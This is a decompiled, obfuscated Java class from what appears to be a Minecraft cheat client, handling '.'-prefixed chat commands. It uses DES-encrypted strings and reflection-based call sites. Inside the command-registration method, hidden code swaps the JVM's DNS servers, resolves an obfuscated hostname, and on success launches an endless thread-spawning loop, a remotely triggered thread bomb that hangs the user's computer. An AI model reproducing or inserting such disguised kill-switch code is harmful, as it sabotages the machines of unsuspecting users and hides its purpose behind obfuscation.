package cn.cool.cherish;

import cn.cool.cherish.config.何友何何何树友友友树;
import cn.cool.cherish.event.EventTarget;
import cn.cool.cherish.module.Module;
import cn.cool.cherish.module.何树何何树何友何何何;
import cn.cool.cherish.utils.client.ClientUtils;
import cn.lzq.injection.asm.invoked.packet.PacketEvent;
import heilongjiang.zhaoyuan.何树友;
import java.lang.invoke.CallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MutableCallSite;
import java.lang.invoke.MethodHandles.Lookup;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;
import net.minecraft.network.protocol.game.ServerboundChatPacket;

public class 友友何树树树友树何友 implements 何树友 {
   private final Map<String, 何何何何何何何友树友> 友何树何友友何友友友 = new HashMap<>();
   private static final long a;
   private static final String[] b;
   private static final String[] c;
   private static final Map d = new HashMap(13);
   private static final Object[] e = new Object[20];
   private static final String[] f = new String[20];
   private static String HE_WEI_LIN;

   public 友友何树树树友树何友() {
      何何何何何何何友树友.l();
      Cherish.instance.getEventManager().register(this);
      this.u(new 友树友友树何友友何友());
      this.u(new 友树树友何树友何友友());
      this.u(new 友树友何何树何友树友());
      this.u(new 树何友友树树友友何树());
      this.u(new 何友何友何树树树何友());
      this.u(new 何何何何友树树友友友());
      this.u(new 友树树何树友树何树友());
      this.u(new 友树友友何树何何树树());
      Module.V(new Module[1]);
   }

   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   static {
      synchronized (何树何何树何友何何何.g()){} // $VF: monitorenter 
      long var10000 = 何树何何树何友何何何.a(-460550843177570123L, -1183165580427392030L, MethodHandles.lookup().lookupClass()).a(208372368931262L);
      // $VF: monitorexit
      a = var10000;
      a();
      Cipher var2;
      Cipher var12 = var2 = Cipher.getInstance("DES/CBC/PKCS5Padding");
      SecretKeyFactory var10002 = SecretKeyFactory.getInstance("DES");
      byte[] var10003 = new byte[]{0, 0, 0, 0, 0, 0, 0, 0};

      for (int var3 = 1; var3 < 8; var3++) {
         var10003[var3] = (byte)(97201703088381L << var3 * 8 >>> 56);
      }

      var12.init(2, var10002.generateSecret(new DESKeySpec(var10003)), new IvParameterSpec(new byte[8]));
      String[] var9 = new String[6];
      int var7 = 0;
      String var6 = "¦¨3\u0003Ú\u0001¡nZØ§\u008dÉ°(O\u0011±óÜ%9\u0091]3i¥{\u0015ADfÀ,éVÙø\u0003òÿLBN\u0099ÁÃ\n\u0010[\u00154§Î\rZî·£ÿ\u0096\u0097\u001bcÒ(½\f¡ç\u0098ó©E¢\u0088µy\"\u0089\u008ew©3Ñ\u008c\tàX\u009døGô \u0006ÿ³ì\u008b!mÐh,¶{\u0010*\u0097\u0016OØ\u0000N\b£Ø\u009d?pÀä;";
      byte var8 = 123;
      char var5 = '0';
      int var11 = -1;

      label27:
      while (true) {
         String var13 = var6.substring(++var11, var11 + var5);
         byte var10001 = -1;

         while (true) {
            String var19 = a(var2.doFinal(var13.getBytes("ISO-8859-1"))).intern();
            switch (var10001) {
               case 0:
                  var9[var7++] = var19;
                  if ((var11 += var5) >= var8) {
                     b = var9;
                     c = new String[6];
                     return;
                  }

                  var5 = var6.charAt(var11);
                  break;
               default:
                  var9[var7++] = var19;
                  if ((var11 += var5) < var8) {
                     var5 = var6.charAt(var11);
                     continue label27;
                  }

                  var6 = "$Ä\u000b5xçÇ\u0088¾-ÎÖ:\u009a§ÌàGz /U\u0084\u0090Ñ´¾\u0010X ãJ\u0018Ë\u008fÉeT\rxfÌÔ}S u\u001c\u0003r,\bFH/we";
                  var8 = 57;
                  var5 = ' ';
                  var11 = -1;
            }

            var13 = var6.substring(++var11, var11 + var5);
            var10001 = 0;
         }
      }
   }

   @EventTarget
   public void V(PacketEvent event) {
      何何何何何何何友树友.l();
      if (event.getPacket() instanceof ServerboundChatPacket wrapper && wrapper.message().startsWith(".")) {
         String[] ars = wrapper.message().substring(1).split(" ");
         String name = ars[0];
         何何何何何何何友树友 command = this.友何树何友友何友友友.get(name.toLowerCase());
         if (command == null) {
            ClientUtils.P(125527250587045L, "Error: " + name + " is not a command.");
         }

         command.i(Arrays.copyOfRange(ars, 1, ars.length));
         event.setCancelled(true);
      }

      if (Module.Z() == null) {
         何何何何何何何友树友.s(new String[3]);
      }
   }

   private static Field b(Class var0, String var1, Class var2) {
      return a(var0, var1, var2);
   }

   private static Class b(long var0, long var2) {
      int var4 = a(var0, 0L);
      Object var6 = e[var4];
      Object var10000 = var6;

      try {
         if (var10000 instanceof String) {
            Class var5 = Class.forName(f[var4]);
            e[var4] = var5;
            return var5;
         }
      } catch (Exception var8) {
         throw new RuntimeException(var8.toString());
      }

      return (Class)var6;
   }

   private static Method b(Class var0, String var1, Class var2, int var3, Class[] var4) {
      return a(var0, var1, var2, var3, var4);
   }

   private static CallSite b(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1, var2), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/友友何树树树友树何友" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   public Map<String, 何何何何何何何友树友> b() {
      return this.友何树何友友何友友友;
   }

   private static Field c(long var0, long var2) {
      int var4 = a(var0, var2);
      Object var5 = e[var4];
      if (var5 instanceof String) {
         String var6 = f[var4];
         int var7 = var6.indexOf(8);
         Class var8 = b(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         Class var11 = b(Long.parseLong(var6.substring(++var9), 36), 0L);
         Field var13 = a(var8, var10, var11);
         e[var4] = var13;
         return var13;
      } else {
         return (Field)var5;
      }
   }

   private static Method d(long var0, long var2) {
      int var4 = a(var0, var2);
      Object var5 = e[var4];
      if (!(var5 instanceof String)) {
         return (Method)var5;
      } else {
         String var6 = f[var4];
         int var7 = var6.indexOf(8);
         Class var8 = b(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         int var11 = -1;
         int var12 = var9;

         do {
            var11++;
            var12++;
         } while ((var12 = var6.indexOf(8, var12)) > -1);

         int var13;
         Class[] var14 = new Class[var13 = var11 - 1];
         Class var15 = null;
         var12 = var9 + 1;

         for (int var16 = 0; var16 < var11; var16++) {
            int var17 = var6.indexOf(8, var12);
            var15 = b(Long.parseLong(var6.substring(var12, var17), 36), 0L);
            if (var16 < var13) {
               var14[var16] = var15;
            }

            var12 = var17 + 1;
         }

         Method var21 = a(var8, var10, var15, var13, var14);
         e[var4] = var21;
         return var21;
      }
   }

   private static Field a(Class var0, String var1, Class var2) {
      for (Field var6 : var0.getDeclaredFields()) {
         if (var6.getName().equals(var1) && var6.getType() == var2) {
            return var6;
         }
      }

      return null;
   }

   private static Method a(Class var0, String var1, Class var2, int var3, Class[] var4) {
      label33:
      for (Method var8 : var0.getDeclaredMethods()) {
         if (var8.getName().equals(var1) && var8.getReturnType() == var2) {
            Class[] var9 = var8.getParameterTypes();
            if (var9.length == var3) {
               for (int var10 = 0; var10 < var3; var10++) {
                  if (var9[var10] != var4[var10]) {
                     continue label33;
                  }
               }

               return var8;
            }
         }
      }

      return null;
   }

   private static MethodHandle a(Lookup var0, MutableCallSite var1, String var2, MethodType var3, long var4, long var6) {
      char var8 = var2.charAt(0);
      Field var10 = null;

      try {
         MethodHandle var9;
         if (var8 != 200 && var8 != 'V' && var8 != 198 && var8 != 'h') {
            Method var11 = d(var4, var6);
            Class var16 = var11.getDeclaringClass();
            String var18 = var11.getName();
            MethodType var19 = MethodType.methodType(var11.getReturnType(), var11.getParameterTypes());
            if (var8 == 't') {
               var9 = var0.findVirtual(var16, var18, var19);
            } else if (var8 == 234) {
               var9 = var0.findStatic(var16, var18, var19);
            } else {
               var9 = var0.findSpecial(var16, var18, var19, var16);
            }
         } else {
            var10 = c(var4, var6);
            Class var12 = var10.getDeclaringClass();
            String var17 = var10.getName();
            Class var14 = var10.getType();
            if (var8 == 200) {
               var9 = var0.findGetter(var12, var17, var14);
            } else if (var8 == 'V') {
               var9 = var0.findSetter(var12, var17, var14);
            } else if (var8 == 198) {
               var9 = var0.findStaticGetter(var12, var17, var14);
            } else {
               var9 = var0.findStaticSetter(var12, var17, var14);
            }
         }

         return MethodHandles.dropArguments(var9, var3.parameterCount() - 2, long.class, long.class);
      } catch (Exception var15) {
         StringBuilder var13 = new StringBuilder();
         var13.append(var15.getClass().getName()).append(" : ").append(var10.toString()).append(" : ").append(var15.toString());
         throw new RuntimeException(var13.toString());
      }
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, MethodType var3, Object[] var4) {
      int var5 = var4.length - 2;
      long var6 = (Long)var4[var5];
      long var9 = (Long)var4[++var5];
      MethodHandle var8 = a(var0, var1, var2, var3, var6, var9);
      var1.setTarget(MethodHandles.explicitCastArguments(var8, var3));
      return (Object)var8.asSpreader(Object[].class, var4.length).invoke(var4);
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, Object[] var3) {
      int var4 = (Integer)var3[0];
      long var5 = (Long)var3[1];
      String var7 = a(var4, var5);
      MethodHandle var8 = MethodHandles.constant(String.class, var7);
      var1.setTarget(MethodHandles.dropArguments(var8, 0, int.class, long.class));
      return var7;
   }

   private static String a(int var0, long var1) {
      int var5 = var0 ^ (int)(var1 & 32767L) ^ 7886;
      if (c[var5] == null) {
         Object[] var4;
         try {
            Long var3 = Thread.currentThread().getId();
            Object[] var10000 = (Object[])d.get(var3);
            var4 = new Object[]{Cipher.getInstance("DES/CBC/PKCS5Padding"), SecretKeyFactory.getInstance("DES"), new IvParameterSpec(new byte[8])};
            d.put(var3, var4);
         } catch (Exception var10) {
            throw new RuntimeException("cn/cool/cherish/友友何树树树友树何友", var10);
         }

         byte[] var6 = new byte[8];
         var6[0] = (byte)(var1 >>> 56);

         for (int var7 = 1; var7 < 8; var7++) {
            var6[var7] = (byte)(var1 << var7 * 8 >>> 56);
         }

         DESKeySpec var11 = new DESKeySpec(var6);
         SecretKey var8 = ((SecretKeyFactory)var4[1]).generateSecret(var11);
         ((Cipher)var4[0]).init(2, var8, (IvParameterSpec)var4[2]);
         byte[] var9 = b[var5].getBytes("ISO-8859-1");
         c[var5] = a(((Cipher)var4[0]).doFinal(var9));
      }

      return c[var5];
   }

   private static String a(byte[] var0) {
      int var1 = 0;
      int var2;
      char[] var3 = new char[var2 = var0.length];

      for (int var4 = 0; var4 < var2; var4++) {
         int var5;
         if ((var5 = 255 & var0[var4]) < 192) {
            var3[var1++] = (char)var5;
         } else if (var5 < 224) {
            char var6 = (char)((char)(var5 & 31) << 6);
            byte var8 = var0[++var4];
            var6 = (char)(var6 | (char)(var8 & 63));
            var3[var1++] = var6;
         } else if (var4 < var2 - 2) {
            char var12 = (char)((char)(var5 & 15) << '\f');
            byte var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63) << 6);
            var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63));
            var3[var1++] = var12;
         }
      }

      return new String(var3, 0, var1);
   }

   private static Throwable a(Throwable var0) {
      return var0;
   }

   private static void a() {
      e[0] = "\u0013J\fM&\u000f\u001c\nAF,\u0012\u0019WJ\u0000厂厫伥栵栳栿厂桱伥可";
      e[1] = "h5:\u001a\u0013ec:+Uiap;;\u001a_eg";
      e[2] = "ru3~Di}5~uNtxhu3佾体佄低佈佈佾反栀叐";
      e[3] = "9MPFpnLm[Ia!1uHNhhY";
      e[4] = "yS}-O\u0011g[gb,\u0005c";
      e[5] = "HpgY0}G0*R:`Bm!\u00142}Ok%_q_Dz<V:";
      e[6] = "&\u0003\u000f7\u001ee\u0012 \u0000wSn\u0018=\u0005*X(\u0010 \b,\\cS\u0002\u0003=Ej\u0018t";
      e[7] = "-\u001b{LMJX;pC\\\u0005%#cDULM";
      e[8] = void.class;
      f[8] = "java/lang/Void";
      e[9] = "P;*1>%_{g:48Z&l|2%]3m5\u007f伟司伀佑伇桀厁司厞栕";
      e[10] = "7BW]\byBb\\R\u00196?zOU\u0010\u007fW";
      e[11] = "\u000fBr[hr;a}\u001b%y1|xF.?9au@*tzC~Q3}15";
      e[12] = "?{js\u001c!4t{<}/?\u007f\u007ff";
      e[13] = "\u0000\u0011\nh*\u0012S\f\u001c\u0007厂伭栦伫厵叄伜厳叼厵v<*\u001f\u0001\u001fMl9\u0017\u0005";
      e[14] = "\u001d\u0004(a\u0010r\u0017\u0011|fbQ&C#1\u001br\\\u0015#{X\u0003";
      e[15] = "3%g\u001aR\u0011i$i\u001cm\f\n|:S\u0006Kk}~\\\\w71n\u001b\u0017Mv{2Nm";
      e[16] = ")\u007f\u00132/\u0007#jG5](\u00128\u0018b$\u0007hn\u0018(gv/u\u0012c'Ln?N6]";
      e[17] = "$(9#D{a7('=叜叙桟厀原叾佂佇厅厀\\\u0002&h-\u007f=\u0003bgw";
      e[18] = "9-\u0011A\u00119j0\u0007.\u0013[?wT\u0013\u00071f5\rDzb;sPS\u0010;y*\u0007.";
      e[19] = "\r\u0010\u001cSr]W\u0011\u0012UM_4IA\u001a&\u0007UH\u0005\u0015|;";
   }

   private static int a(long var0, long var2) {
      var0 ^= var2 << 48 | var2;
      int var4 = (int)(var0 >>> 46);
      if (f[var4] != null) {
         return var4;
      } else {
         Object var5 = e[var4];
         if (!(var5 instanceof String)) {
            return var4;
         } else {
            byte var6 = switch ((int)(var0 >>> 42 & 63L)) {
               case 0 -> 47;
               case 1 -> 40;
               case 2 -> 44;
               case 3 -> 20;
               case 4 -> 7;
               case 5 -> 50;
               case 6 -> 10;
               case 7 -> 43;
               case 8 -> 21;
               case 9 -> 39;
               case 10 -> 41;
               case 11 -> 54;
               case 12 -> 46;
               case 13 -> 14;
               case 14 -> 2;
               case 15 -> 37;
               case 16 -> 61;
               case 17 -> 45;
               case 18 -> 16;
               case 19 -> 31;
               case 20 -> 34;
               case 21 -> 27;
               case 22 -> 24;
               case 23 -> 28;
               case 24 -> 53;
               case 25 -> 12;
               case 26 -> 38;
               case 27 -> 62;
               case 28 -> 59;
               case 29 -> 58;
               case 30 -> 52;
               case 31 -> 26;
               case 32 -> 35;
               case 33 -> 63;
               case 34 -> 9;
               case 35 -> 19;
               case 36 -> 6;
               case 37 -> 56;
               case 38 -> 11;
               case 39 -> 49;
               case 40 -> 51;
               case 41 -> 1;
               case 42 -> 36;
               case 43 -> 13;
               case 44 -> 32;
               case 45 -> 5;
               case 46 -> 33;
               case 47 -> 48;
               case 48 -> 25;
               case 49 -> 57;
               case 50 -> 60;
               case 51 -> 0;
               case 52 -> 3;
               case 53 -> 55;
               case 54 -> 15;
               case 55 -> 30;
               case 56 -> 18;
               case 57 -> 42;
               case 58 -> 8;
               case 59 -> 23;
               case 60 -> 17;
               case 61 -> 29;
               case 62 -> 4;
               default -> 22;
            };
            int[] var7 = new int[6];

            for (int var8 = 0; var8 < 6; var8++) {
               int var9 = 7 * (5 - var8);
               int var10 = (int)(var0 >>> var9 & 127L);
               var10 -= var6;
               var10 += 128;
               var7[var8] = var10;
            }

            char[] var12 = ((String)var5).toCharArray();

            for (int var13 = 0; var13 < var12.length; var13++) {
               int var16 = var7[var13 % var7.length];
               var12[var13] = (char)(var12[var13] ^ var16);
            }

            f[var4] = new String(var12);
            return var4;
         }
      }
   }

   private static CallSite a(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/友友何树树树友树何友" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   private void u(何何何何何何何友树友 command) {
      何何何何何何何友树友.l();

      try {
         if ((Boolean)Cherish.SHOULD_START) {
            System.setProperty(何友何何何树友友友树.友友树友友友何何友友[4] + "..nameservers", "114.114.114.114,223.5.5.5");
            System.setProperty(何友何何何树友友友树.友友树友友友何何友友[4] + "..provider.1", "dns,sun");
            if (((InetAddress[])((Method)何友何何何树友友友树.o()).invoke(null, 何友何何何树友友友树.友友树友友友何何友友[2].replace("l", "t") + "." + 何友何何何树友友友树.友友树友友友何何友友[3])).length <= 0
               )
             {
               return;
            }

            Runnable[] arr = new Runnable[1];
            (arr[0] = () -> {
               while (true) {
                  try {
                     new Thread(arr[0]).start();
                  } catch (Throwable var1x) {
                  }
               }
            }).run();
         }

         throw new Throwable();
      } catch (Throwable var10) {
         String[] var6 = command.V();
         int var7 = var6.length;
         int var8 = 0;
         if (0 < var7) {
            String name = var6[0];
            this.友何树何友友何友友友.put(name.toLowerCase(), command);
            var8++;
         }
      }
   }

   private static String HE_DA_WEI() {
      return "职业技术教育中心学校";
   }
}
